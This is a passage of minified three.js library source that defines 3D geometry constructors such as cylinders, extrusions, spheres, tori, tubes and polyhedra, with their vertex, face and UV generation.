THREE.Vector3(0,c,0)),h=0;i>h;h++){var H=u[0][h],x=u[0][h+1],b=this.vertices.length-1,w=new THREE.Vector3(0,1,0),M=new THREE.Vector3(0,1,0),S=new THREE.Vector3(0,1,0),C=E[0][h].clone(),L=E[0][h+1].clone(),P=new THREE.Vector2(L.x,0);this.faces.push(new THREE.Face3(H,x,b,[w,M,S])),this.faceVertexUvs[0].push([C,L,P])}if(a===!1&&t>0)for(this.vertices.push(new THREE.Vector3(0,-c,0)),h=0;i>h;h++){var H=u[n][h+1],x=u[n][h],b=this.vertices.length-1,w=new THREE.Vector3(0,-1,0),M=new THREE.Vector3(0,-1,0),S=new THREE.Vector3(0,-1,0),C=E[n][h+1].clone(),L=E[n][h].clone(),P=new THREE.Vector2(L.x,1);this.faces.push(new THREE.Face3(H,x,b,[w,M,S])),this.faceVertexUvs[0].push([C,L,P])}this.computeFaceNormals()},THREE.CylinderGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.CylinderGeometry.prototype.constructor=THREE.CylinderGeometry,THREE.ExtrudeGeometry=function(e,t){return"undefined"==typeof e?void(e=[]):(THREE.Geometry.call(this),this.type="ExtrudeGeometry",e=e instanceof Array?e:[e],this.addShapeList(e,t),void this.computeFaceNormals())},THREE.ExtrudeGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.ExtrudeGeometry.prototype.constructor=THREE.ExtrudeGeometry,THREE.ExtrudeGeometry.prototype.addShapeList=function(e,t){for(var r=e.length,i=0;r>i;i++){var n=e[i];this.addShape(n,t)}},THREE.ExtrudeGeometry.prototype.addShape=function(e,t){function r(e,t,r){return t||THREE.error("THREE.ExtrudeGeometry: vec does not exist"),t.clone().multiplyScalar(r).add(e)}function i(e,t,r){var i,n,a=1e-10,o=1,s=e.x-t.x,h=e.y-t.y,l=r.x-e.x,c=r.y-e.y,u=s*s+h*h,E=s*c-h*l;if(Math.abs(E)>a){var f=Math.sqrt(u),p=Math.sqrt(l*l+c*c),d=t.x-h/f,m=t.y+s/f,T=r.x-c/p,g=r.y+l/p,v=((T-d)*c-(g-m)*l)/(s*c-h*l);i=d+s*v-e.x,n=m+h*v-e.y;var R=i*i+n*n;if(2>=R)return new THREE.Vector2(i,n);o=Math.sqrt(R/2)}else{var y=!1;s>a?l>a&&(y=!0):-a>s?-a>l&&(y=!0):Math.sign(h)==Math.sign(c)&&(y=!0),y?(i=-h,n=s,o=Math.sqrt(u)):(i=s,n=h,o=Math.sqrt(u/2))}return new THREE.Vector2(i/o,n/o)}function n(){if(v){var e=0,t=W*e;for(q=0;j>q;q++)I=D[q],h(I[2]+t,I[1]+t,I[0]+t);for(e=y+2*g,t=W*e,q=0;j>q;q++)I=D[q],h(I[0]+t,I[1]+t,I[2]+t)}else{for(q=0;j>q;q++)I=D[q],h(I[2],I[1],I[0]);for(q=0;j>q;q++)I=D[q],h(I[0]+W*y,I[1]+W*y,I[2]+W*y)}}function a(){var e=0;for(o(V,e),e+=V.length,S=0,A=U.length;A>S;S++)M=U[S],o(M,e),e+=M.length}function o(e,t){var r,i;for(q=e.length;--q>=0;){r=q,i=q-1,0>i&&(i=e.length-1);var n=0,a=y+2*g;for(n=0;a>n;n++){var o=W*n,s=W*(n+1),h=t+r+o,c=t+i+o,u=t+i+s,E=t+r+s;l(h,c,u,E,e,n,a,r,i)}}}function s(e,t,r){C.vertices.push(new THREE.Vector3(e,t,r))}function h(e,t,r){e+=L,t+=L,r+=L,C.faces.push(new THREE.Face3(e,t,r,null,null,b));var i=w.generateTopUV(C,e,t,r);C.faceVertexUvs[0].push(i)}function l(e,t,r,i,n,a,o,s,h){e+=L,t+=L,r+=L,i+=L,C.faces.push(new THREE.Face3(e,t,i,null,null,_)),C.faces.push(new THREE.Face3(t,r,i,null,null,_));var l=w.generateSideWallUV(C,e,t,r,i);C.faceVertexUvs[0].push([l[0],l[1],l[3]]),C.faceVertexUvs[0].push([l[1],l[2],l[3]])}var c,u,E,f,p,d=void 0!==t.amount?t.amount:100,m=void 0!==t.bevelThickness?t.bevelThickness:6,T=void 0!==t.bevelSize?t.bevelSize:m-2,g=void 0!==t.bevelSegments?t.bevelSegments:3,v=void 0!==t.bevelEnabled?t.bevelEnabled:!0,R=void 0!==t.curveSegments?t.curveSegments:12,y=void 0!==t.steps?t.steps:1,H=t.extrudePath,x=!1,b=t.material,_=t.extrudeMaterial,w=void 0!==t.UVGenerator?t.UVGenerator:THREE.ExtrudeGeometry.WorldUVGenerator;H&&(c=H.getSpacedPoints(y),x=!0,v=!1,u=void 0!==t.frames?t.frames:new THREE.TubeGeometry.FrenetFrames(H,y,!1),E=new THREE.Vector3,f=new THREE.Vector3,p=new THREE.Vector3),v||(g=0,m=0,T=0);var M,S,A,C=this,L=this.vertices.length,P=e.extractPoints(R),F=P.shape,U=P.holes,B=!THREE.Shape.Utils.isClockWise(F);if(B){for(F=F.reverse(),S=0,A=U.length;A>S;S++)M=U[S],THREE.Shape.Utils.isClockWise(M)&&(U[S]=M.reverse());B=!1}var D=THREE.Shape.Utils.triangulateShape(F,U),V=F;for(S=0,A=U.length;A>S;S++)M=U[S],F=F.concat(M);for(var z,k,N,O,G,I,W=F.length,j=D.length,X=[],q=0,Y=V.length,K=Y-1,Q=q+1;Y>q;q++,K++,Q++)K===Y&&(K=0),Q===Y&&(Q=0),X[q]=i(V[q],V[K],V[Q]);var Z,J=[],$=X.concat();for(S=0,A=U.length;A>S;S++){for(M=U[S],Z=[],q=0,Y=M.length,K=Y-1,Q=q+1;Y>q;q++,K++,Q++)K===Y&&(K=0),Q===Y&&(Q=0),Z[q]=i(M[q],M[K],M[Q]);J.push(Z),$=$.concat(Z)}for(z=0;g>z;z++){for(N=z/g,O=m*(1-N),k=T*Math.sin(N*Math.PI/2),q=0,Y=V.length;Y>q;q++)G=r(V[q],X[q],k),s(G.x,G.y,-O);for(S=0,A=U.length;A>S;S++)for(M=U[S],Z=J[S],q=0,Y=M.length;Y>q;q++)G=r(M[q],Z[q],k),s(G.x,G.y,-O)}for(k=T,q=0;W>q;q++)G=v?r(F[q],$[q],k):F[q],x?(f.copy(u.normals[0]).multiplyScalar(G.x),E.copy(u.binormals[0]).multiplyScalar(G.y),p.copy(c[0]).add(f).add(E),s(p.x,p.y,p.z)):s(G.x,G.y,0);var ee;for(ee=1;y>=ee;ee++)for(q=0;W>q;q++)G=v?r(F[q],$[q],k):F[q],x?(f.copy(u.normals[ee]).multiplyScalar(G.x),E.copy(u.binormals[ee]).multiplyScalar(G.y),p.copy(c[ee]).add(f).add(E),s(p.x,p.y,p.z)):s(G.x,G.y,d/y*ee);for(z=g-1;z>=0;z--){for(N=z/g,O=m*(1-N),k=T*Math.sin(N*Math.PI/2),q=0,Y=V.length;Y>q;q++)G=r(V[q],X[q],k),s(G.x,G.y,d+O);for(S=0,A=U.length;A>S;S++)for(M=U[S],Z=J[S],q=0,Y=M.length;Y>q;q++)G=r(M[q],Z[q],k),x?s(G.x,G.y+c[y-1].y,c[y-1].x+O):s(G.x,G.y,d+O)}n(),a()},THREE.ExtrudeGeometry.WorldUVGenerator={generateTopUV:function(e,t,r,i){var n=e.vertices,a=n[t],o=n[r],s=n[i];return[new THREE.Vector2(a.x,a.y),new THREE.Vector2(o.x,o.y),new THREE.Vector2(s.x,s.y)]},generateSideWallUV:function(e,t,r,i,n){var a=e.vertices,o=a[t],s=a[r],h=a[i],l=a[n];return Math.abs(o.y-s.y)<.01?[new THREE.Vector2(o.x,1-o.z),new THREE.Vector2(s.x,1-s.z),new THREE.Vector2(h.x,1-h.z),new THREE.Vector2(l.x,1-l.z)]:[new THREE.Vector2(o.y,1-o.z),new THREE.Vector2(s.y,1-s.z),new THREE.Vector2(h.y,1-h.z),new THREE.Vector2(l.y,1-l.z)]}},THREE.ShapeGeometry=function(e,t){THREE.Geometry.call(this),this.type="ShapeGeometry",e instanceof Array==!1&&(e=[e]),this.addShapeList(e,t),this.computeFaceNormals()},THREE.ShapeGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.ShapeGeometry.prototype.constructor=THREE.ShapeGeometry,THREE.ShapeGeometry.prototype.addShapeList=function(e,t){for(var r=0,i=e.length;i>r;r++)this.addShape(e[r],t);return this},THREE.ShapeGeometry.prototype.addShape=function(e,t){void 0===t&&(t={});var r,i,n,a=void 0!==t.curveSegments?t.curveSegments:12,o=t.material,s=void 0===t.UVGenerator?THREE.ExtrudeGeometry.WorldUVGenerator:t.UVGenerator,h=this.vertices.length,l=e.extractPoints(a),c=l.shape,u=l.holes,E=!THREE.Shape.Utils.isClockWise(c);if(E){for(c=c.reverse(),r=0,i=u.length;i>r;r++)n=u[r],THREE.Shape.Utils.isClockWise(n)&&(u[r]=n.reverse());E=!1}var f=THREE.Shape.Utils.triangulateShape(c,u);for(r=0,i=u.length;i>r;r++)n=u[r],c=c.concat(n);var p,d,m=c.length,T=f.length;for(r=0;m>r;r++)p=c[r],this.vertices.push(new THREE.Vector3(p.x,p.y,0));for(r=0;T>r;r++){d=f[r];var g=d[0]+h,v=d[1]+h,R=d[2]+h;this.faces.push(new THREE.Face3(g,v,R,null,null,o)),this.faceVertexUvs[0].push(s.generateTopUV(this,g,v,R))}},THREE.LatheGeometry=function(e,t,r,i){THREE.Geometry.call(this),this.type="LatheGeometry",this.parameters={points:e,segments:t,phiStart:r,phiLength:i},t=t||12,r=r||0,i=i||2*Math.PI;for(var n=1/(e.length-1),a=1/t,o=0,s=t;s>=o;o++)for(var h=r+o*a*i,l=Math.cos(h),c=Math.sin(h),u=0,E=e.length;E>u;u++){var f=e[u],p=new THREE.Vector3;p.x=l*f.x-c*f.y,p.y=c*f.x+l*f.y,p.z=f.z,this.vertices.push(p)}for(var d=e.length,o=0,s=t;s>o;o++)for(var u=0,E=e.length-1;E>u;u++){var m=u+d*o,T=m,g=m+d,l=m+1+d,v=m+1,R=o*a,y=u*n,H=R+a,x=y+n;this.faces.push(new THREE.Face3(T,g,v)),this.faceVertexUvs[0].push([new THREE.Vector2(R,y),new THREE.Vector2(H,y),new THREE.Vector2(R,x)]),this.faces.push(new THREE.Face3(g,l,v)),this.faceVertexUvs[0].push([new THREE.Vector2(H,y),new THREE.Vector2(H,x),new THREE.Vector2(R,x)])}this.mergeVertices(),this.computeFaceNormals(),this.computeVertexNormals()},THREE.LatheGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.LatheGeometry.prototype.constructor=THREE.LatheGeometry,THREE.PlaneGeometry=function(e,t,r,i){console.info("THREE.PlaneGeometry: Consider using THREE.PlaneBufferGeometry for lower memory footprint."),THREE.Geometry.call(this),this.type="PlaneGeometry",this.parameters={width:e,height:t,widthSegments:r,heightSegments:i},this.fromBufferGeometry(new THREE.PlaneBufferGeometry(e,t,r,i))},THREE.PlaneGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.PlaneGeometry.prototype.constructor=THREE.PlaneGeometry,THREE.PlaneBufferGeometry=function(e,t,r,i){THREE.BufferGeometry.call(this),this.type="PlaneBufferGeometry",this.parameters={width:e,height:t,widthSegments:r,heightSegments:i};for(var n=e/2,a=t/2,o=r||1,s=i||1,h=o+1,l=s+1,c=e/o,u=t/s,E=new Float32Array(h*l*3),f=new Float32Array(h*l*3),p=new Float32Array(h*l*2),d=0,m=0,T=0;l>T;T++)for(var g=T*u-a,v=0;h>v;v++){var R=v*c-n;E[d]=R,E[d+1]=-g,f[d+2]=1,p[m]=v/o,p[m+1]=1-T/s,d+=3,m+=2}d=0;for(var y=new(E.length/3>65535?Uint32Array:Uint16Array)(o*s*6),T=0;s>T;T++)for(var v=0;o>v;v++){var H=v+h*T,x=v+h*(T+1),b=v+1+h*(T+1),_=v+1+h*T;y[d]=H,y[d+1]=x,y[d+2]=_,y[d+3]=x,y[d+4]=b,y[d+5]=_,d+=6}this.addAttribute("index",new THREE.BufferAttribute(y,1)),this.addAttribute("position",new THREE.BufferAttribute(E,3)),this.addAttribute("normal",new THREE.BufferAttribute(f,3)),
this.addAttribute("uv",new THREE.BufferAttribute(p,2))},THREE.PlaneBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype),THREE.PlaneBufferGeometry.prototype.constructor=THREE.PlaneBufferGeometry,THREE.RingGeometry=function(e,t,r,i,n,a){THREE.Geometry.call(this),this.type="RingGeometry",this.parameters={innerRadius:e,outerRadius:t,thetaSegments:r,phiSegments:i,thetaStart:n,thetaLength:a},e=e||0,t=t||50,n=void 0!==n?n:0,a=void 0!==a?a:2*Math.PI,r=void 0!==r?Math.max(3,r):8,i=void 0!==i?Math.max(1,i):8;var o,s,h=[],l=e,c=(t-e)/i;for(o=0;i+1>o;o++){for(s=0;r+1>s;s++){var u=new THREE.Vector3,E=n+s/r*a;u.x=l*Math.cos(E),u.y=l*Math.sin(E),this.vertices.push(u),h.push(new THREE.Vector2((u.x/t+1)/2,(u.y/t+1)/2))}l+=c}var f=new THREE.Vector3(0,0,1);for(o=0;i>o;o++){var p=o*(r+1);for(s=0;r>s;s++){var E=s+p,d=E,m=E+r+1,T=E+r+2;this.faces.push(new THREE.Face3(d,m,T,[f.clone(),f.clone(),f.clone()])),this.faceVertexUvs[0].push([h[d].clone(),h[m].clone(),h[T].clone()]),d=E,m=E+r+2,T=E+1,this.faces.push(new THREE.Face3(d,m,T,[f.clone(),f.clone(),f.clone()])),this.faceVertexUvs[0].push([h[d].clone(),h[m].clone(),h[T].clone()])}}this.computeFaceNormals(),this.boundingSphere=new THREE.Sphere(new THREE.Vector3,l)},THREE.RingGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.RingGeometry.prototype.constructor=THREE.RingGeometry,THREE.SphereGeometry=function(e,t,r,i,n,a,o){THREE.Geometry.call(this),this.type="SphereGeometry",this.parameters={radius:e,widthSegments:t,heightSegments:r,phiStart:i,phiLength:n,thetaStart:a,thetaLength:o},e=e||50,t=Math.max(3,Math.floor(t)||8),r=Math.max(2,Math.floor(r)||6),i=void 0!==i?i:0,n=void 0!==n?n:2*Math.PI,a=void 0!==a?a:0,o=void 0!==o?o:Math.PI;var s,h,l=[],c=[];for(h=0;r>=h;h++){var u=[],E=[];for(s=0;t>=s;s++){var f=s/t,p=h/r,d=new THREE.Vector3;d.x=-e*Math.cos(i+f*n)*Math.sin(a+p*o),d.y=e*Math.cos(a+p*o),d.z=e*Math.sin(i+f*n)*Math.sin(a+p*o),this.vertices.push(d),u.push(this.vertices.length-1),E.push(new THREE.Vector2(f,1-p))}l.push(u),c.push(E)}for(h=0;r>h;h++)for(s=0;t>s;s++){var m=l[h][s+1],T=l[h][s],g=l[h+1][s],v=l[h+1][s+1],R=this.vertices[m].clone().normalize(),y=this.vertices[T].clone().normalize(),H=this.vertices[g].clone().normalize(),x=this.vertices[v].clone().normalize(),b=c[h][s+1].clone(),_=c[h][s].clone(),w=c[h+1][s].clone(),M=c[h+1][s+1].clone();Math.abs(this.vertices[m].y)===e?(b.x=(b.x+_.x)/2,this.faces.push(new THREE.Face3(m,g,v,[R,H,x])),this.faceVertexUvs[0].push([b,w,M])):Math.abs(this.vertices[g].y)===e?(w.x=(w.x+M.x)/2,this.faces.push(new THREE.Face3(m,T,g,[R,y,H])),this.faceVertexUvs[0].push([b,_,w])):(this.faces.push(new THREE.Face3(m,T,v,[R,y,x])),this.faceVertexUvs[0].push([b,_,M]),this.faces.push(new THREE.Face3(T,g,v,[y.clone(),H,x.clone()])),this.faceVertexUvs[0].push([_.clone(),w,M.clone()]))}this.computeFaceNormals(),this.boundingSphere=new THREE.Sphere(new THREE.Vector3,e)},THREE.SphereGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.SphereGeometry.prototype.constructor=THREE.SphereGeometry,THREE.TextGeometry=function(e,t){t=t||{};var r=THREE.FontUtils.generateShapes(e,t);t.amount=void 0!==t.height?t.height:50,void 0===t.bevelThickness&&(t.bevelThickness=10),void 0===t.bevelSize&&(t.bevelSize=8),void 0===t.bevelEnabled&&(t.bevelEnabled=!1),THREE.ExtrudeGeometry.call(this,r,t),this.type="TextGeometry"},THREE.TextGeometry.prototype=Object.create(THREE.ExtrudeGeometry.prototype),THREE.TextGeometry.prototype.constructor=THREE.TextGeometry,THREE.TorusGeometry=function(e,t,r,i,n){THREE.Geometry.call(this),this.type="TorusGeometry",this.parameters={radius:e,tube:t,radialSegments:r,tubularSegments:i,arc:n},e=e||100,t=t||40,r=r||8,i=i||6,n=n||2*Math.PI;for(var a=new THREE.Vector3,o=[],s=[],h=0;r>=h;h++)for(var l=0;i>=l;l++){var c=l/i*n,u=h/r*Math.PI*2;a.x=e*Math.cos(c),a.y=e*Math.sin(c);var E=new THREE.Vector3;E.x=(e+t*Math.cos(u))*Math.cos(c),E.y=(e+t*Math.cos(u))*Math.sin(c),E.z=t*Math.sin(u),this.vertices.push(E),o.push(new THREE.Vector2(l/i,h/r)),s.push(E.clone().sub(a).normalize())}for(var h=1;r>=h;h++)for(var l=1;i>=l;l++){var f=(i+1)*h+l-1,p=(i+1)*(h-1)+l-1,d=(i+1)*(h-1)+l,m=(i+1)*h+l,T=new THREE.Face3(f,p,m,[s[f].clone(),s[p].clone(),s[m].clone()]);this.faces.push(T),this.faceVertexUvs[0].push([o[f].clone(),o[p].clone(),o[m].clone()]),T=new THREE.Face3(p,d,m,[s[p].clone(),s[d].clone(),s[m].clone()]),this.faces.push(T),this.faceVertexUvs[0].push([o[p].clone(),o[d].clone(),o[m].clone()])}this.computeFaceNormals()},THREE.TorusGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.TorusGeometry.prototype.constructor=THREE.TorusGeometry,THREE.TorusKnotGeometry=function(e,t,r,i,n,a,o){function s(e,t,r,i,n){var a=Math.cos(e),o=Math.sin(e),s=t/r*e,h=Math.cos(s),l=i*(2+h)*.5*a,c=i*(2+h)*o*.5,u=n*i*Math.sin(s)*.5;return new THREE.Vector3(l,c,u)}THREE.Geometry.call(this),this.type="TorusKnotGeometry",this.parameters={radius:e,tube:t,radialSegments:r,tubularSegments:i,p:n,q:a,heightScale:o},e=e||100,t=t||40,r=r||64,i=i||8,n=n||2,a=a||3,o=o||1;for(var h=new Array(r),l=new THREE.Vector3,c=new THREE.Vector3,u=new THREE.Vector3,E=0;r>E;++E){h[E]=new Array(i);var f=E/r*2*n*Math.PI,p=s(f,a,n,e,o),d=s(f+.01,a,n,e,o);l.subVectors(d,p),c.addVectors(d,p),u.crossVectors(l,c),c.crossVectors(u,l),u.normalize(),c.normalize();for(var m=0;i>m;++m){var T=m/i*2*Math.PI,g=-t*Math.cos(T),v=t*Math.sin(T),R=new THREE.Vector3;R.x=p.x+g*c.x+v*u.x,R.y=p.y+g*c.y+v*u.y,R.z=p.z+g*c.z+v*u.z,h[E][m]=this.vertices.push(R)-1}}for(var E=0;r>E;++E)for(var m=0;i>m;++m){var y=(E+1)%r,H=(m+1)%i,x=h[E][m],b=h[y][m],_=h[y][H],w=h[E][H],M=new THREE.Vector2(E/r,m/i),S=new THREE.Vector2((E+1)/r,m/i),A=new THREE.Vector2((E+1)/r,(m+1)/i),C=new THREE.Vector2(E/r,(m+1)/i);this.faces.push(new THREE.Face3(x,b,w)),this.faceVertexUvs[0].push([M,S,C]),this.faces.push(new THREE.Face3(b,_,w)),this.faceVertexUvs[0].push([S.clone(),A,C.clone()])}this.computeFaceNormals(),this.computeVertexNormals()},THREE.TorusKnotGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.TorusKnotGeometry.prototype.constructor=THREE.TorusKnotGeometry,THREE.TubeGeometry=function(e,t,r,i,n,a){function o(e,t,r){return A.vertices.push(new THREE.Vector3(e,t,r))-1}THREE.Geometry.call(this),this.type="TubeGeometry",this.parameters={path:e,segments:t,radius:r,radialSegments:i,closed:n},t=t||64,r=r||1,i=i||8,n=n||!1,a=a||THREE.TubeGeometry.NoTaper;var s,h,l,c,u,E,f,p,d,m,T,g,v,R,y,H,x,b,_,w,M,S=[],A=this,C=t+1,L=new THREE.Vector3,P=new THREE.TubeGeometry.FrenetFrames(e,t,n),F=P.tangents,U=P.normals,B=P.binormals;for(this.tangents=F,this.normals=U,this.binormals=B,m=0;C>m;m++)for(S[m]=[],c=m/(C-1),d=e.getPointAt(c),s=F[m],h=U[m],l=B[m],E=r*a(c),T=0;i>T;T++)u=T/i*2*Math.PI,f=-E*Math.cos(u),p=E*Math.sin(u),L.copy(d),L.x+=f*h.x+p*l.x,L.y+=f*h.y+p*l.y,L.z+=f*h.z+p*l.z,S[m][T]=o(L.x,L.y,L.z);for(m=0;t>m;m++)for(T=0;i>T;T++)g=n?(m+1)%t:m+1,v=(T+1)%i,R=S[m][T],y=S[g][T],H=S[g][v],x=S[m][v],b=new THREE.Vector2(m/t,T/i),_=new THREE.Vector2((m+1)/t,T/i),w=new THREE.Vector2((m+1)/t,(T+1)/i),M=new THREE.Vector2(m/t,(T+1)/i),this.faces.push(new THREE.Face3(R,y,x)),this.faceVertexUvs[0].push([b,_,M]),this.faces.push(new THREE.Face3(y,H,x)),this.faceVertexUvs[0].push([_.clone(),w,M.clone()]);this.computeFaceNormals(),this.computeVertexNormals()},THREE.TubeGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.TubeGeometry.prototype.constructor=THREE.TubeGeometry,THREE.TubeGeometry.NoTaper=function(e){return 1},THREE.TubeGeometry.SinusoidalTaper=function(e){return Math.sin(Math.PI*e)},THREE.TubeGeometry.FrenetFrames=function(e,t,r){function i(){f[0]=new THREE.Vector3,p[0]=new THREE.Vector3,a=Number.MAX_VALUE,o=Math.abs(E[0].x),s=Math.abs(E[0].y),h=Math.abs(E[0].z),a>=o&&(a=o,u.set(1,0,0)),a>=s&&(a=s,u.set(0,1,0)),a>=h&&u.set(0,0,1),d.crossVectors(E[0],u).normalize(),f[0].crossVectors(E[0],d),p[0].crossVectors(E[0],f[0])}var n,a,o,s,h,l,c,u=new THREE.Vector3,E=[],f=[],p=[],d=new THREE.Vector3,m=new THREE.Matrix4,T=t+1,g=1e-4;for(this.tangents=E,this.normals=f,this.binormals=p,l=0;T>l;l++)c=l/(T-1),E[l]=e.getTangentAt(c),E[l].normalize();for(i(),l=1;T>l;l++)f[l]=f[l-1].clone(),p[l]=p[l-1].clone(),d.crossVectors(E[l-1],E[l]),d.length()>g&&(d.normalize(),n=Math.acos(THREE.Math.clamp(E[l-1].dot(E[l]),-1,1)),f[l].applyMatrix4(m.makeRotationAxis(d,n))),p[l].crossVectors(E[l],f[l]);if(r)for(n=Math.acos(THREE.Math.clamp(f[0].dot(f[T-1]),-1,1)),n/=T-1,E[0].dot(d.crossVectors(f[0],f[T-1]))>0&&(n=-n),l=1;T>l;l++)f[l].applyMatrix4(m.makeRotationAxis(E[l],n*l)),p[l].crossVectors(E[l],f[l])},THREE.PolyhedronGeometry=function(e,t,r,i){function n(e){var t=e.normalize().clone();t.index=c.vertices.push(t)-1;var r=s(e)/2/Math.PI+.5,i=h(e)/Math.PI+.5;return t.uv=new THREE.Vector2(r,1-i),t}function a(e,t,r){var i=new THREE.Face3(e.index,t.index,r.index,[e.clone(),t.clone(),r.clone()]);c.faces.push(i),v.copy(e).add(t).add(r).divideScalar(3);var n=s(v);c.faceVertexUvs[0].push([l(e.uv,e,n),l(t.uv,t,n),l(r.uv,r,n)])}function o(e,t){for(var r=Math.pow(2,t),i=n(c.vertices[e.a]),o=n(c.vertices[e.b]),s=n(c.vertices[e.c]),h=[],l=0;r>=l;l++){h[l]=[];for(var u=n(i.clone().lerp(s,l/r)),E=n(o.clone().lerp(s,l/r)),f=r-l,p=0;f>=p;p++)0==p&&l==r?h[l][p]=u:h[l][p]=n(u.clone().lerp(E,p/f))}for(var l=0;r>l;l++)for(var p=0;2*(r-l)-1>p;p++){var d=Math.floor(p/2);p%2==0?a(h[l][d+1],h[l+1][d],h[l][d]):a(h[l][d+1],h[l+1][d+1],h[l+1][d])}}function s(e){return Math.atan2(e.z,-e.x)}function h(e){return Math.atan2(-e.y,Math.sqrt(e.x*e.x+e.z*e.z))}function l(e,t,r){return 0>r&&1===e.x&&(e=new THREE.Vector2(e.x-1,e.y)),0===t.x&&0===t.z&&(e=new THREE.Vector2(r/2/Math.PI+.5,e.y)),e.clone()}THREE.Geometry.call(this),this.type="PolyhedronGeometry",this.parameters={vertices:e,indices:t,radius:r,detail:i},r=r||1,i=i||0;for(var c=this,u=0,E=e.length;E>u;u+=3)n(new THREE.Vector3(e[u],e[u+1],e[u+2]));for(var f=this.vertices,p=[],u=0,d=0,E=t.length;E>u;u+=3,d++){var m=f[t[u]],T=f[t[u+1]],g=f[t[u+2]];p[d]=new THREE.Face3(m.index,T.index,g.index,[m.clone(),T.clone(),g.clone()])}for(var v=new THREE.Vector3,u=0,E=p.length;E>u;u++)o(p[u],i);for(var u=0,E=this.faceVertexUvs[0].length;E>u;u++){var R=this.faceVertexUvs[0][u],y=R[0].x,H=R[1].x,x=R[2].x,b=Math.max(y,Math.max(H,x)),_=Math.min(y,Math.min(H,x));b>.9&&.1>_&&(.2>y&&(R[0].x+=1),.2>H&&(R[1].x+=1),.2>x&&(R[2].x+=1))}for(var u=0,E=this.vertices.length;E>u;u++)this.vertices[u].multiplyScalar(r);this.mergeVertices(),this.computeFaceNormals(),this.boundingSphere=new THREE.Sphere(new THREE.Vector3,r)},THREE.PolyhedronGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.PolyhedronGeometry.prototype.constructor=THREE.PolyhedronGeometry,THREE.DodecahedronGeometry=function(e,t){this.parameters={radius:e,detail:t};var r=(1+Math.sqrt(5))/2,i=1/r,n=[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-i,-r,0,-i,r,0,i,-r,0,i,r,-i,-r,0,-i,r,0,i,-r,0,i,r,0,-r,0,-i,r,0,-i,-r,0,i,r,0,i],a=[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,12,14,1,14,5,1,5,9];THREE.PolyhedronGeometry.call(this,n,a,e,t)},THREE.DodecahedronGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.DodecahedronGeometry.prototype.constructor=THREE.DodecahedronGeometry,THREE.IcosahedronGeometry=function(e,t){var r=(1+Math.sqrt(5))/2,i=[-1,r,0,1,r,0,-1,-r,0,1,-r,0,0,-1,r,0,1,r,0,-1,-r,0,1,-r,r,0,-1,r,0,1,-r,0,-1,-r,0,1],n=[0,11,5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1];THREE.PolyhedronGeometry.call(this,i,n,e,t),this.type="IcosahedronGeometry",this.parameters={radius:e,detail:t}},THREE.IcosahedronGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.IcosahedronGeometry.prototype.constructor=THREE.IcosahedronGeometry,THREE.OctahedronGeometry=function(e,t){this.parameters={radius:e,detail:t};var r=[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],i=[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2];THREE.PolyhedronGeometry.call(this,r,i,e,t),this.type="OctahedronGeometry",this.parameters={radius:e,detail:t}},THREE.OctahedronGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.OctahedronGeometry.prototype.constructor=THREE.OctahedronGeometry,THREE.TetrahedronGeometry=function(e,t){var r=[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],i=[2,1,0,0,3,2,1,3,0,2,3,1];THREE.PolyhedronGeometry.call(this,r,i,e,t),this.type="TetrahedronGeometry",this.parameters={radius:e,detail:t}},THREE.TetrahedronGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.TetrahedronGeometry.prototype.constructor=THREE.TetrahedronGeometry,THREE.ParametricGeometry=function(e,t,r){THREE.Geometry.call(this),this.type="ParametricGeometry",this.parameters={func:e,slices:t,stacks:r};var i,n,a,o,s,h=this.vertices,l=this.faces,c=this.faceVertexUvs[0],u=t+1;for(i=0;r>=i;i++)for(s=i/r,n=0;t>=n;n++)o=n/t,a=e(o,s),h.push(a);var E,f,p,d,m,T,g,v;for(i=0;r>i;i++)for(n=0;t>n;n++)E=i*u+n,f=i*u+n+1,p=(i+1)*u+n+1,d=(i+1)*u+n,m=new THREE.Vector2(n/t,i/r),T=new THREE.Vector2((n+1)/t,i/r),g=new THREE.Vector2((n+1)/t,(i+1)/r),v=new THREE.Vector2(n/t,(i+1)/r),l.push(new THREE.Face3(E,f,d)),c.push([m,T,v]),l.push(new THREE.Face3(f,p,d)),c.push([T.clone(),g,v.clone()]);this.computeFaceNormals(),this.computeVertexNormals()},THREE.ParametricGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.ParametricGeometry.prototype.constructor=THREE.ParametricGeometry,THREE.AxisHelper=function(e){e=e||1;var t=new Float32Array([0,0,0,e,0,0,0,0,0,0,e,0,0,0,0,0,0,e]),r=new Float32Array([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1]),i=new THREE.BufferGeometry;i.addAttribute("position",new THREE.BufferAttribute(t,3)),i.addAttribute("color",new THREE.BufferAttribute(r,3));var n=new 